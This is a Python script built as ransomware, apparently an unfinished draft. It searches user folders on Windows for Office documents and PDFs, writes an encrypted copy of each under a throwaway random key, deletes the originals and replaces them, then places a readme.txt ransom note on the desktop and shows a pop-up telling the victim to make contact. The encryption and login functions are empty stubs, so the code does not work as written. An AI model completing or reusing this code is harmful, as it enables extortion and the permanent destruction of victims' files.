import os
import glob
import shutil
import tkinter as tk
from tkinter import messagebox
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def login_screen():
    # Your code for login screen goes here
    pass

def encrypt_file(file_path, key):
    # AES.MODE_ECB encryption code goes here
    pass

def generate_readme():
    # Code to generate readme.txt file on desktop
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    readme_file_path = os.path.join(desktop_path, 'readme.txt')
    with open(readme_file_path, 'w') as f:
        f.write('Your files have been encrypted. To decrypt them, please contact us for instructions.')

def encrypt_files():
    # Collecting all files of specific file types
    file_types = ['*.docx', '*.xlsx', '*.pptx', '*.pdf']
    file_paths = []
    for file_type in file_types:
        file_paths.extend(glob.glob('C:/Users/**/' + file_type, recursive=True))
        file_paths.extend(glob.glob('C:/Users/*/' + file_type, recursive=True))
    
    # Encrypting and saving files with new extension
    for file_path in file_paths:
        key = os.urandom(16)
        encrypted_file_path = file_path + '.encrypted'
        with open(file_path, 'rb') as f_in, open(encrypted_file_path, 'wb') as f_out:
            f_out.write(encrypt_file(f_in.read(), key))
        os.remove(file_path)
        shutil.move(encrypted_file_path, file_path)
    
    # Generating readme.txt file and pop-up message
    generate_readme()
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo('Important', 'Your files have been encrypted. Please check the readme.txt file on your desktop for instructions.')
    root.destroy()

if __name__ == '__main__':
    login_screen()  # Call the login_screen function before starting the encryption process
    encrypt_files()  # Call the encrypt_files function to start encrypting the files
